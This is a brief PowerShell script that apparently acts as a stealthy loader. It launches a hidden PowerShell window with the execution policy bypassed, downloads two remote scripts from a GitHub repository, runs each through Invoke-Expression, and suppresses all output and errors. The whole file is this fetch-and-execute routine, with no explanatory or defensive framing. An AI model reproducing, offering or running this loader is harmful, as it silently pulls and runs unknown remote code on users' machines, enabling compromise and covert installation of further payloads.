cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# URLs of the files to download
$urls = @(
    "https://github.com/KevinDark5/Project/raw/refs/heads/main/DLLs/r.ps1",
	"https://github.com/KevinDark5/Project/raw/refs/heads/main/DLLs/pnld.ps1"
    
)

# Download and execute each file
foreach ($url in $urls) {
    try {
        # Download the content of the file
        $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

        # Check if the content is not empty
        if ($scriptContent) {
            # Execute the content of the file silently
            Invoke-Expression $scriptContent > $null 2>&1
        }
    } catch {
        # Suppress errors
        $null = $_
    }
}